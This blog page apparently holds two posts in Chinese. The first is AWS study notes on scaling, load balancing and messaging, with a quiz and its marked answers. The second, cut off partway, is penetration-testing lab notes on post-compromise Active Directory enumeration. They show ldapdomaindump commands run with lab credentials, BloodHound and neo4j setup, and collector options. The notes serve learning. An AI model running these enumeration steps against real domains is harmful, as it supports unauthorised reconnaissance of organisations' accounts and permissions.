<h2 id="擴展-Amazon-EC2"><a href="#擴展-Amazon-EC2" class="headerlink" title="擴展 Amazon EC2"></a><strong>擴展 Amazon EC2</strong></h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">AWS 的可擴展性和彈性</span><br><span class="line">│</span><br><span class="line">├── 內部部署資料中心的困境</span><br><span class="line">│   ├── 問題: 難以預測需求，容易出現資源閒置或不足的情況</span><br><span class="line">│   ├── 解決方案: AWS 提供的可擴展性和彈性服務</span><br><span class="line">│</span><br><span class="line">├── AWS 的解決方案</span><br><span class="line">│   ├── 可擴展性</span><br><span class="line">│   │   ├── 定義: 根據需求變化自動增減資源，確保足夠的運算容量</span><br><span class="line">│   │   ├── AWS 服務: Amazon EC2 Auto Scaling</span><br><span class="line">│   │   │   ├── 動態調整: 根據實際需求變化自動調整執行個體數量</span><br><span class="line">│   │   │   └── 預測擴展: 根據預測需求自動增減執行個體數量</span><br><span class="line">│   │   │       ├── 加速擴展: 同時使用動態調整和預測擴展</span><br><span class="line">│   │   │</span><br><span class="line">│   ├── 彈性</span><br><span class="line">│       ├── 定義: 建立具有高可用性和容錯能力的系統</span><br><span class="line">│       ├── 方法: 透過解耦和備援來達到</span><br><span class="line">│</span><br><span class="line">└── 關鍵概念</span><br><span class="line"><span class="code">    ├── 可擴展性: 根據實際需求自動調整資源量，確保足夠的運算容量</span></span><br><span class="line"><span class="code">    └── 彈性: 建立高可用性和容錯能力的系統，應對各種潛在問題</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>可擴展性</strong>意味著僅以所需資源開始使用，並且透過設計架構，藉由向外擴展或向內縮減來自動回應需求的變化</li>
<li>只需為所用資源付費，不必擔心運算容量不足，無法滿足客戶需求</li>
<li>Amazon EC2 Auto Scaling 可讓您根據不斷變化的應用程式需求，自動新增或移除 Amazon EC2 執行個體</li>
<li>藉由自動增減所需執行個體，可以維持更高的應用程式可用性</li>
</ul>
<p><img src="/img/AWS12_2.png" alt="Untitled"></p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">應付成長的需求：向上擴展 vs. 水平擴展</span><br><span class="line">│</span><br><span class="line">├── 向上擴展</span><br><span class="line">│   ├── 定義: 為正在執行的電腦提供更多效能</span><br><span class="line">│   ├── 缺點: 增加單一執行個體的效能無法解決客戶需求變化的問題</span><br><span class="line">│</span><br><span class="line">├── 解耦系統的優勢</span><br><span class="line">│   ├── 解釋: 每個執行個體只負責特定的任務，不需增加執行個體來解決單一執行個體負載過大的問題</span><br><span class="line">│   └── 好處: 可根據需求調整每個部分的效能，避免過度佈建</span><br><span class="line">│</span><br><span class="line">└── 水平擴展的解決方案</span><br><span class="line"><span class="code">    ├── Amazon EC2 Auto Scaling</span></span><br><span class="line"><span class="code">    │   ├── 定義: 根據需求自動增減執行個體數量</span></span><br><span class="line"><span class="code">    │   ├── 功能:</span></span><br><span class="line"><span class="code">    │   │   ├── 最小容量: 確保至少有一個執行個體在運行</span></span><br><span class="line"><span class="code">    │   │   ├── 所需容量: 根據需求設定執行個體數量</span></span><br><span class="line"><span class="code">    │   │   └── 最大容量: 設定最大執行個體數量以避免過度擴展</span></span><br><span class="line"><span class="code">    │   └── 優點: 可以動態調整執行個體數量，節省成本並滿足客戶需求</span></span><br><span class="line"><span class="code">    └── 成本效益</span></span><br><span class="line"><span class="code">        └── 優勢: 只需支付實際使用的執行個體，節省成本並提供最佳客戶體驗</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<h2 id="透過-Elastic-Load-Balancing-導引流量"><a href="#透過-Elastic-Load-Balancing-導引流量" class="headerlink" title="透過 Elastic Load Balancing 導引流量"></a><strong>透過 Elastic Load Balancing 導引流量</strong></h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">負載平衡器 (Load Balancer)</span><br><span class="line">│</span><br><span class="line">├── 負載平衡器的作用</span><br><span class="line">│   ├── 解釋: 負責將傳入的請求路由到多個執行個體進行處理</span><br><span class="line">│   └── 目的: 確保每個執行個體的工作負載均衡，提高效能和可用性</span><br><span class="line">│</span><br><span class="line">├── 需要負載平衡器的情況</span><br><span class="line">│   ├── 客戶需求不平均: 導致某些執行個體負載過大，而其他閒置</span><br><span class="line">│   ├── 需要將請求路由到正確的執行個體: 解決多個執行個體間的流量路由問題</span><br><span class="line">│   └── 需要高效能、成本效益、高度可用、自動擴展的系統</span><br><span class="line">│</span><br><span class="line">└── Elastic Load Balancing (ELB)</span><br><span class="line"><span class="code">    ├── 定義: AWS 的一項受管服務，自動在多個執行個體之間分配傳入流量</span></span><br><span class="line"><span class="code">    ├── 特性:</span></span><br><span class="line"><span class="code">    │   ├── 高度可用: 在區域層級執行，具備高度可用性，無需額外操作</span></span><br><span class="line"><span class="code">    │   ├── 自動擴展: 可處理額外的輸送量，每小時成本維持不變</span></span><br><span class="line"><span class="code">    │   └── 自動調整: 根據執行個體的動態變化，自動調整負載</span></span><br><span class="line"><span class="code">    ├── 應用場景:</span></span><br><span class="line"><span class="code">    │   ├── 前端流量: 將傳入流量分配到多個前端執行個體中</span></span><br><span class="line"><span class="code">    │   └── 後端通訊: 將流量路由到最少負載的後端執行個體中</span></span><br><span class="line"><span class="code">    └── 重要性: ELB 和 Amazon EC2 Auto Scaling 共同運作，確保應用程式提供高效能和可用性</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<ul>
<li>如果您有多個 Amazon EC2 執行個體，Elastic Load Balancing 會將工作負載分配到多個執行個體，因此單一執行個體無須承載大部分工作負載</li>
<li>雖然 Elastic Load Balancing 和 Amazon EC2 Auto Scaling 各為不同服務，但兩者共同運作時，有助於確保 Amazon EC2 中執行的應用程式能夠提供高效能和可用性。</li>
</ul>
<p><img src="/img/AWS12_3.png" alt="低需求期間"></p>
<p>低需求期間</p>
<p><img src="/img/AWS12_4.png" alt="高需求期間"></p>
<p>高需求期間</p>
<p><img src="/img/AWS12_5.png" alt="Untitled"></p>
<p><img src="/img/AWS12_6.png" alt="Untitled"></p>
<h2 id="訊息與佇列"><a href="#訊息與佇列" class="headerlink" title="訊息與佇列"></a><strong>訊息與佇列</strong></h2><p>重點 1: 訊息與佇列<br>符號: 📩</p>
<ul>
<li>定義: 將訊息放置在緩衝區中，以解耦應用程式元件之間的通訊。</li>
<li>舉例流程: 收銀員點餐 -&gt; 放置訂單到佇列 -&gt; 咖啡師從佇列取得訂單 -&gt; 製作飲料 -&gt; 移除已完成訂單</li>
</ul>
<p>重點 2: 緊湊耦合 vs. 鬆散耦合<br>符號: 🔗 vs. 🔗🔄</p>
<ul>
<li>定義:<ul>
<li>緊湊耦合: 元件之間<strong>耦合緊密</strong>，一個元件的故障可能<strong>影響整個系統</strong>。</li>
<li>鬆散耦合: 元件之間耦合<strong>較鬆散</strong>，一個元件的故障<strong>不會影響整個系統</strong>。</li>
</ul>
</li>
<li>舉例流程:<ul>
<li>緊湊耦合: 應用程式 A 直接傳送訊息給應用程式 B -&gt; B 故障 -&gt; A 開始發生錯誤</li>
<li>鬆散耦合: 訂單放置到佇列 -&gt; 咖啡師取得訂單 -&gt; 製作飲料 -&gt; 移除已完成訂單</li>
</ul>
</li>
</ul>
<p>重點 3: AWS 服務: Amazon Simple Queue Service (SQS)<br>符號: 📨</p>
<ul>
<li>定義: 可在任何軟體元件之間傳送、存放和接收訊息的服務。</li>
<li>舉例流程: 訂單放置到佇列 -&gt; 咖啡師取得訂單 -&gt; 製作飲料 -&gt; 移除已完成訂單</li>
</ul>
<p>重點 4: AWS 服務: Amazon Simple Notification Service (SNS)<br>符號: 📢</p>
<ul>
<li>定義: 透過發布&#x2F;訂閱模型將訊息傳送至服務或通知終端使用者的服務。</li>
<li>舉例流程: 收銀員點餐 -&gt; 放置訂單到佇列 -&gt; 咖啡師取得訂單 -&gt; 製作飲料 -&gt; 移除已完成訂單</li>
</ul>
<p>重點 5: 單體式應用程式 vs. 微型服務<br>符號: ⬛ vs. 🔲</p>
<ul>
<li><p>定義:</p>
<ul>
<li><p>單體式應用程式: 元件之間耦合緊密，一個元件的故障可能導致整個應用程式失效。</p>
<p>  <img src="/img/AWS12_7.png" alt="Untitled"></p>
</li>
<li><p>微型服務: 元件之間耦合較鬆散，一個元件的故障不會影響整個應用程式。</p>
<p>  <img src="/img/AWS12_8.png" alt="Untitled"></p>
</li>
</ul>
</li>
<li><p>舉例流程:</p>
<ul>
<li>單體式應用程式: 元件耦合緊密 -&gt; 故障可能導致整個應用程式失效<ul>
<li>具備緊耦合元件的應用程式，這些元件可能包括資料庫、伺服器、使用者介面、商業邏輯等</li>
</ul>
</li>
<li>微型服務: 元件彼此鬆散耦合 -&gt; 故障不會影響整個應用程式<ul>
<li>服務和元件滿足不同的功能</li>
<li>有兩種服務可促成應用程式的整合：Amazon Simple Notification Service (Amazon SNS) 和 Amazon Simple Queue Service (Amazon SQS)</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">點餐流程 (單體式應用程式)：</span><br><span class="line">客人 -&gt; 收銀員 -&gt; 咖啡師 -&gt; 客人</span><br><span class="line"></span><br><span class="line">點餐流程 (解耦式使用SQS)：</span><br><span class="line">客人 -&gt; 收銀員 -&gt; SQS (佇列) &lt;- 咖啡師 -&gt; 客人</span><br><span class="line"></span><br><span class="line">電子報發布流程 (SNS)：</span><br><span class="line">發布者 -&gt; SNS 主題 -&gt; 訂閱者</span><br><span class="line"></span><br><span class="line">訂單處理流程 (解耦式使用SQS)：</span><br><span class="line">收銀員 -&gt; SQS (佇列) &lt;- 咖啡師</span><br><span class="line"></span><br><span class="line">咖啡店的訂單流程：</span><br><span class="line"></span><br><span class="line">客人 --&gt; 收銀員：點餐</span><br><span class="line">收銀員 --&gt; 佇列：放入訂單</span><br><span class="line">佇列 --&gt; 咖啡師：取得訂單</span><br><span class="line">咖啡師 --&gt; 客人：製作飲料</span><br><span class="line">咖啡師 --&gt; 佇列：完成訂單移除</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="知識檢測-2"><a href="#知識檢測-2" class="headerlink" title="知識檢測"></a><strong>知識檢測</strong></h3><ol>
<li>哪一種 AWS 服務是向訂閱者發布訊息的最佳選擇？</li>
</ol>
<ul>
<li><input disabled="" type="checkbox"> Amazon Simple Queue Service (Amazon SQS)</li>
<li><input disabled="" type="checkbox"> Amazon EC2 Auto Scaling</li>
<li><input checked="" disabled="" type="checkbox"> Amazon Simple Notification Service (Amazon SNS)</li>
<li><input disabled="" type="checkbox"> Elastic Load Balancing</li>
</ul>
<blockquote>
<p>其他回答皆不正確，因為：</p>
<ul>
<li>Amazon Simple Queue Service (Amazon SQS) 是訊息佇列服務，它不會使用涉及 Amazon SNS 的訊息訂閱和主題模型。</li>
<li>Amazon EC2 Auto Scaling 可讓您根據不斷變化的應用程式需求，自動新增或移除 Amazon EC2 執行個體。</li>
<li>Elastic Load Balancing 是一種可將傳入的應用程式流量自動分配到多個資源 (例如 Amazon EC2 執行個體) 的 AWS 服務。</li>
</ul>
</blockquote>
<h2 id="其他運算服務"><a href="#其他運算服務" class="headerlink" title="其他運算服務"></a><strong>其他運算服務</strong></h2><p><img src="/img/AWS12_9.png" alt="Untitled"></p>
<ul>
<li>將程式碼上傳到 Lambda。</li>
<li>將程式碼設定為從事件來源 (例如 AWS 服務、行動應用程式或 HTTP 端點) 觸發。</li>
<li>Lambda 只會在觸發時執行程式碼。</li>
<li>您只需為使用的運算時間支付費用。在前述的影像大小調整範例中，您只需針對上傳新影像時所用的運算時間付費。上傳影像會觸發 Lambda 執行調整影像大小的程式碼。</li>
</ul>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">AWS 運算服務</span><br><span class="line">├─ EC2 (Elastic Compute Cloud)</span><br><span class="line">│    ├─ 靈活、可靠、高度可擴展</span><br><span class="line">│    ├─ 適用於各種使用案例</span><br><span class="line">│    ├─ 需要自行設定和管理執行個體機群</span><br><span class="line">│    └─ 試著託管傳統應用程式且想要完整存取基礎作業系統例如 Linux 或 Windows</span><br><span class="line">├─ 無伺服器運算</span><br><span class="line">│    ├─ Lambda</span><br><span class="line">│    │    ├─ 無需佈建或管理這些伺服器環境，完全不想要管理基礎環境</span><br><span class="line">│    │    ├─ 只需專注於應用程式開發</span><br><span class="line">│    │    ├─ 每次觸發都會自動擴展函數</span><br><span class="line">│    │    └─ 託管短期執行的函數、服務導向或事件導向的應用程式</span><br><span class="line">│    └─ Fargate</span><br><span class="line">│         ├─ 可用於 ECS 或 EKS 的無伺服器運算平台</span><br><span class="line">│         ├─ 想要在 AWS 上執行 Docker 容器型工作負載(選擇工具 (ECS or EKS) -&gt; 選擇平台 (自行管理的EC2 or Fargate代替管理)</span><br><span class="line">│         └─ 不需管理基礎環境，只需專注於應用程式</span><br><span class="line">└─ 容器服務</span><br><span class="line"><span class="code">     ├─ ECS (Elastic Container Service)</span></span><br><span class="line"><span class="code">     │    ├─ 高度擴展的高效能容器管理系統</span></span><br><span class="line"><span class="code">     │    └─ 支援 Docker 容器</span></span><br><span class="line"><span class="code">     ├─ EKS (Elastic Kubernetes Service)</span></span><br><span class="line"><span class="code">     │    ├─ 全受管服務，用於在 AWS 上執行 Kubernetes</span></span><br><span class="line"><span class="code">     │    └─ 支援大規模部署和管理容器化應用程式</span></span><br><span class="line"><span class="code">     └─ 其他容器化服務</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">咖啡廳舉例的流程圖：</span><br><span class="line"></span><br><span class="line">咖啡廳</span><br><span class="line">├─ 顧客進入咖啡廳</span><br><span class="line">│    ├─ 選擇座位</span><br><span class="line">│    │    ├─ 在內用區域</span><br><span class="line">│    │    │    ├─ 選擇桌子</span><br><span class="line">│    │    │    └─ 坐下等待</span><br><span class="line">│    │    └─ 在外帶區域</span><br><span class="line">│    │         ├─ 排隊點餐</span><br><span class="line">│    │         └─ 等待取餐</span><br><span class="line">│    └─ 等待服務員接待</span><br><span class="line">│         ├─ 服務員接待顧客</span><br><span class="line">│         └─ 點餐</span><br><span class="line">└─ 顧客享用咖啡</span><br><span class="line"><span class="code">     ├─ 室內用餐</span></span><br><span class="line"><span class="code">     │    ├─ 服務員送上餐點</span></span><br><span class="line"><span class="code">     │    └─ 顧客享用</span></span><br><span class="line"><span class="code">     └─ 外帶</span></span><br><span class="line"><span class="code">          ├─ 服務員呼叫顧客取餐</span></span><br><span class="line"><span class="code">          └─ 顧客取餐</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<p><strong>無伺服器運算</strong></p>
<p><img src="/img/AWS12_10.png" alt="Untitled"></p>
<ul>
<li>佈建執行個體 (虛擬伺服器)</li>
<li>上傳程式碼</li>
<li>在應用程式執行時繼續管理執行個體</li>
</ul>
<p>試著託管傳統應用程式且想要完整存取基礎作業系統例如 Linux 或 Windows</p>
<h2 id="第二單元總結"><a href="#第二單元總結" class="headerlink" title="第二單元總結"></a>第二單元總結</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">雲端運算</span><br><span class="line">└─ 定義：透過網際網路提供的 IT 資源隨需交付，採實支實付的定價形式</span><br><span class="line"></span><br><span class="line">AWS 服務</span><br><span class="line">├─ EC2 (Elastic Compute Cloud)</span><br><span class="line">│    ├─ 定義：動態啟動及關閉虛擬伺服器</span><br><span class="line">│    ├─ 類別：一般用途、運算最佳化、記憶體最佳化、加速運算、儲存最佳化</span><br><span class="line">│    └─ 擴展：垂直擴展、水平擴展 (使用 Auto Scaling)</span><br><span class="line">├─ 定價模式：隨需選項、Spot 定價、Savings Plans 或預留執行個體</span><br><span class="line">├─ Elastic Load Balancer：將傳入流量分配給 EC2 執行個體</span><br><span class="line">├─ 訊息服務：SQS (Simple Queue Service) 和 SNS (Simple Notification Service)</span><br><span class="line">├─ 容器服務：ECS (Elastic Container Service) 和 EKS (Elastic Kubernetes Service)</span><br><span class="line">├─ 無伺服器運算：AWS Lambda 和 AWS Fargate</span><br><span class="line">└─ Lambda：可直接上傳程式碼並設定觸發條件執行，只在實際執行程式碼時收費</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="單元二測驗"><a href="#單元二測驗" class="headerlink" title="單元二測驗"></a>單元二測驗</h3><ol>
<li>如果您想要將 Amazon EC2 執行個體使用於批次處理工作負載，那麼最好使用哪種 Amazon EC2 執行個體類型？</li>
</ol>
<ul>
<li><input disabled="" type="checkbox"> 一般用途</li>
<li><input disabled="" type="checkbox"> 記憶體最佳化</li>
<li><input checked="" disabled="" type="checkbox"> 運算最佳化</li>
<li><input disabled="" type="checkbox"> 儲存最佳化</li>
</ul>
<blockquote>
<p>其他回答選項皆不正確，因為：</p>
<ul>
<li>一般用途的執行個體會平衡使用計算、記憶體和網路資源。此執行個體系列對於這個案例中的應用程式並非最佳選擇。運算最佳化執行個體比一般用途的執行個體更適合批次處理的工作負載。</li>
<li>記憶體最佳化執行個體較適合需處理記憶體中大型資料集的工作負載，例如高效能資料庫。</li>
<li>儲存最佳化執行個體專為需要對本機儲存體上的大型資料集進行高量連續讀取和寫入存取的工作負載所設計。問題並未指定要處理的資料規模。批次處理的方式為分組處理資料。運算最佳化執行個體非常適合這種類型可從高效能處理器中受益的工作負載。</li>
</ul>
</blockquote>
<ol>
<li>Amazon EC2 預留執行個體的合約長度選項有哪些？(請選取兩個。)</li>
</ol>
<ul>
<li><input checked="" disabled="" type="checkbox"> 1 年</li>
<li><input disabled="" type="checkbox"> 2 年</li>
<li><input checked="" disabled="" type="checkbox"> 3 年</li>
<li><input disabled="" type="checkbox"> 4 年</li>
<li><input disabled="" type="checkbox"> 5 年</li>
</ul>
<blockquote>
<p>預留執行個體需要 1 年或 3 年的承諾。3 年期選項提供更高的折扣。</p>
</blockquote>
<ol>
<li>您的工作負載總共會執行 6 個月，並且可以承受中斷，那麼最具成本效益的 Amazon EC2 購買選項是什麼？</li>
</ol>
<ul>
<li><input disabled="" type="checkbox"> 預留執行個體</li>
<li><input checked="" disabled="" type="checkbox"> Spot 執行個體</li>
<li><input disabled="" type="checkbox"> 專用執行個體</li>
<li><input disabled="" type="checkbox"> 隨需執行個體</li>
</ul>
<blockquote>
<p>其他回答選項皆不正確，因為：</p>
<ul>
<li>預留執行個體需要 1 年或 3 年的合約期。此案例中的工作負載只會執行 6 個月。</li>
<li>在單一客戶專用硬體上的 Virtual Private Cloud (VPC) 中執行的專用執行個體。這個選項比其他在共用硬體執行的選項具有更高成本。</li>
<li>隨需執行個體符合僅執行 6 個月的需求。不過，Spot 執行個體才是最佳選擇，因為它不需要最低合約期，且能夠承受中斷，成本也低於隨需執行個體。</li>
</ul>
</blockquote>
<ol>
<li>哪個程序是 Elastic Load Balancing 的範例？</li>
</ol>
<ul>
<li><input checked="" disabled="" type="checkbox"> 確保沒有任何一個 Amazon EC2 執行個體必須自行執行完整工作負載</li>
<li><input disabled="" type="checkbox"> 在需求低時移除不需要的 Amazon EC2 執行個體</li>
<li><input disabled="" type="checkbox"> 在線上商店的熱門銷售期間新增第二個 Amazon EC2 執行個體</li>
<li><input disabled="" type="checkbox"> 自動調整 Amazon EC2 執行個體的數量，以便滿足需求</li>
</ul>
<blockquote>
<p>Elastic Load Balancing 是一種可在多個資源 (例如 Amazon EC2 執行個體) 之間自動分配傳入應用程式流量的 AWS 服務。這項特性有助於確保沒有任何一個資源會遭過度使用。</p>
<p>其他選項都是 Auto Scaling 的範例。</p>
</blockquote>
<ol>
<li>如果您想要部署和管理容器化的應用程式，您應該使用哪一種服務？</li>
</ol>
<ul>
<li><input disabled="" type="checkbox"> AWS Lambda</li>
<li><input disabled="" type="checkbox"> Amazon Simple Notification Service (Amazon SNS)</li>
<li><input disabled="" type="checkbox"> Amazon Simple Queue Service (Amazon SQS)</li>
<li><input checked="" disabled="" type="checkbox"> Amazon Elastic Kubernetes Service (Amazon EKS)</li>
</ul>
<blockquote>
<p>Amazon EKS 是一項完全受管的 Kubernetes 服務。Kubernetes 是一種開放原始碼軟體，可讓您大規模部署和管理容器化應用程式。</p>
<p>其他回答選項皆不正確，因為：</p>
<ul>
<li>AWS Lambda 這項服務用於讓您無需佈建或管理伺服器就能執行程式碼。</li>
<li>Amazon Simple Queue Service (Amazon SQS) 這項服務用於讓您透過佇列在軟體元件之間傳送、存放和接收訊息。</li>
<li>Amazon Simple Notification Service (Amazon SNS) 是一種發布&#x2F;訂閱服務。使用 Amazon SNS 主題，發布者可將訊息發布給訂閱者。</li>
</ul>
</blockquote>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-Attacking Active Directory Post-Compromise Enumera" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Attacking%20Active%20Directory%20Post-Compromise%20Enumera/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.072Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Attacking%20Active%20Directory%20Post-Compromise%20Enumera/">
        AD - Post Compromise Enumeration
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Attacking-Active-Directory-Post-Compromise-Enumeration"><a href="#Attacking-Active-Directory-Post-Compromise-Enumeration" class="headerlink" title="Attacking Active Directory: Post-Compromise Enumeration"></a>Attacking Active Directory: Post-Compromise Enumeration</h1><ul>
<li>We’ve compromised a user. Now what?</li>
<li>There are a few tools that offer quick, and efficient enumeration<ul>
<li>Bloodhound</li>
<li>Plumhound</li>
<li>Ldapdomaindump</li>
<li>PingCastle</li>
<li>And whatever else your heart desires</li>
</ul>
</li>
</ul>
<h2 id="Domain-Enumeration-with-ldapdomaindump"><a href="#Domain-Enumeration-with-ldapdomaindump" class="headerlink" title="Domain Enumeration with ldapdomaindump"></a><strong>Domain Enumeration with ldapdomaindump</strong></h2><ul>
<li><strong>ldapdomaindump</strong><ul>
<li>IPV6 relay attack and automatically gave us some information</li>
</ul>
</li>
</ul>
<h3 id="LDAP-explain"><a href="#LDAP-explain" class="headerlink" title="LDAP explain"></a>LDAP explain</h3><p>想像你是一個學校的辦公室助理。你有一個很大的文件櫃，裡面有所有學生和老師的資料。每個文件夾都標有名字，裡面放著這個人的各種資料，比如他們的姓名、地址、電話號碼等等。</p>
<p>現在，假設有一天，老師們需要找到所有年齡在 10 到 12 歲之間的學生，以便安排一個校外活動。他們來找你幫忙，而你要做的就是打開文件櫃，查找所有年齡在這個範圍內的學生，然後把他們的名字和相關資料提供給老師們。</p>
<p>在這個例子中，你就像是 LDAP 伺服器，而文件櫃就像是資料庫。LDAP 是一個用於組織和存儲資訊的協議，就像是你在文件櫃中組織和存儲學生和老師的資料一樣。</p>
<p>老師們向你發出了一個查詢，就像他們要找到特定條件下的學生一樣。你根據這個查詢去文件櫃中尋找符合條件的資料，然後提供給他們。LDAP 就是這樣的一個系統，它可以幫助人們快速地查找和訪問存儲在資料庫中的資訊。</p>
<ul>
<li>用於透過 LDAP <strong>收集和解析資訊並以人類可讀格式以及機器可讀的 json 和 csv&#x2F;tsv.&#x2F;greppable 檔案輸出的工具</strong>。</li>
</ul>
<p>LDAPDomainDump是一款透過LDAP實現的活動目錄資訊收集工具。在一個活動目錄網域中，任何認證使用者都可以透過LDAP來取得大量有趣的資訊。因此，在<strong>網路偵查階段的資訊收集</strong>過程中，LDAP就變成了一個非常「有價值」的協定了。</p>
<p>但問題就在於，<strong>一般透過LDAP匯出的資料並非可讀格式</strong>，而ldapdomaindump這款工具正好可以解決這個問題。它可以透過LDAP收集和解析數據，並將其輸出為人類可讀的HTML格式以及機器可讀的JSON和CSV&#x2F;TSV格式。</p>
<p>first make a directory，因為要將dump下來的所有檔案丟到這目錄下，或是 -o 寫上目錄名稱</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# <span class="built_in">mkdir</span> marvel.local                </span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# <span class="built_in">cd</span> marvel.local          </span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[~/marvel.local]</span><br><span class="line">└─# **ldapdomaindump ldaps://192.168.19.140 -u <span class="string">&#x27;MARVEL\fcastle&#x27;</span> -p Password1**</span><br><span class="line">[*] Connecting to host...</span><br><span class="line">[*] Binding to host</span><br><span class="line">[+] Bind OK                                                                                  </span><br><span class="line">[*] Starting domain dump</span><br><span class="line">[+] Domain dump finished</span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[~/marvel.local]</span><br><span class="line">└─# <span class="built_in">ls</span>                                                                    </span><br><span class="line">domain_computers_by_os.html  domain_groups.grep  **domain_policy.html**  domain_trusts.json          domain_users.json</span><br><span class="line">domain_computers.grep        domain_groups.html  domain_policy.json  **domain_users_by_group.html**</span><br><span class="line">**domain_computers.html**        domain_groups.json  domain_trusts.grep  domain_users.grep</span><br><span class="line">domain_computers.json        domain_policy.grep  domain_trusts.html  domain_users.html</span><br></pre></td></tr></table></figure>

<p>開啟檔案查看內容，如果無法用指令開啟firefox，依據錯誤訊息修改群組</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/marvel.local]</span><br><span class="line">└─# firefox domain_users_by_group.html                             </span><br><span class="line">Running Firefox as root <span class="keyword">in</span> a regular user<span class="string">&#x27;s session is not supported.  ($XAUTHORITY is **/home/kali/.Xauthority** which is owned by kali.)</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">┌──(root㉿kali)-[~/marvel.local]</span></span><br><span class="line"><span class="string">└─# **chown -R root:root /home/kali/.Xauthority**      </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">┌──(root㉿kali)-[~/marvel.local]</span></span><br><span class="line"><span class="string">└─# **firefox domain_users_by_group.html**</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/ADEmum_Untitled.png" alt="Untitled"></p>
<p>可以查看到很多訊息，並從中獲取可能洩漏的機敏資訊</p>
<p>1、domain_groups: 目標網域的群組列表</p>
<p>2、domain_users: 目標網域的使用者列表</p>
<p>3、domain_computers: 目標網域的電腦帳號列表</p>
<p>4、domain_policy: 網域原則，例如是否需要密碼等</p>
<p>5、domain_trusts: 傳入和傳出域屬性以及是否受信任</p>
<h2 id="Domain-Enumeration-with-Bloodhound"><a href="#Domain-Enumeration-with-Bloodhound" class="headerlink" title="Domain Enumeration with Bloodhound"></a><strong>Domain Enumeration with Bloodhound</strong></h2><ul>
<li>install bloodhound</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound</a></p>
<p><a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/m/articles/10334679">https://ithelp.ithome.com.tw/m/articles/10334679</a></p>
<ul>
<li>資料視覺化工具</li>
<li>這意味著沒有任何資料根本沒有用</li>
<li>擅長視覺化 Active Directory 物件關係以及這些關係之間的各種權限</li>
<li>可顯示 Active Directory 環境中的潛在攻擊路徑。</li>
<li>使用圖論並直觀地映射使用者帳戶、群組和其他 Active Directory 網路元件之間的關係</li>
<li>您可以使用 BloodHound 的 GUI 分析此訊息，以發現安全性設定錯誤</li>
<li>自動收集 Active Directory 環境資訊。</li>
<li>建立 Active Directory 環境的視覺化圖表。</li>
<li>分析 Active Directory 資訊並識別潛在的攻擊路徑。</li>
<li>自訂查詢語言 (Cypher)，可讓您搜尋安全漏洞和攻擊路徑。</li>
<li>能夠根據調查結果建立報告和文件。</li>
<li>BloodHoundAD 分析可以標準化為一種報告格式，可用於有關修正常見 Active Directory 控制路徑漏洞的資料驅動決策。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/bloodhound]</span><br><span class="line">└─# **pip install bloodhound**          <span class="comment">#這沒下載會無法用bloodhound-python</span></span><br><span class="line">Collecting bloodhound</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **neo4j console <span class="comment">#一定要先設定好，預設帳密 neo4j/neo4j 登入成功才能改密碼**</span></span><br><span class="line">Directories <span class="keyword">in</span> use:</span><br><span class="line">home:         /usr/share/neo4j</span><br><span class="line">config:       /usr/share/neo4j/conf</span><br><span class="line">logs:         /etc/neo4j/logs</span><br><span class="line">plugins:      /usr/share/neo4j/plugins</span><br><span class="line">import:       /usr/share/neo4j/import</span><br><span class="line">data:         /etc/neo4j/data</span><br><span class="line">certificates: /usr/share/neo4j/certificates</span><br><span class="line">licenses:     /usr/share/neo4j/licenses</span><br><span class="line">run:          /var/lib/neo4j/run</span><br><span class="line">Starting Neo4j.</span><br><span class="line">...</span><br><span class="line">2024-02-24 14:53:20.328+0000 INFO  Remote interface available at http://localhost:7474/</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">****</span><br></pre></td></tr></table></figure>

<p><code>-d</code> 設置網域，<code>-u</code>設置登入的使用者，<code>-p</code>設置登入密碼，<code>-gc</code>設置主機，<code>-c</code>設置要收集的方法，包含Group、LocalAdmin、Session、Trusts、Default (all previous)、DCOnly (no computer connections)、DCOM、RDP、PSRemote、LoggedOn、Container、ObjectProps、ACL、All，<code>-ns</code>設置名稱伺服器。</p>
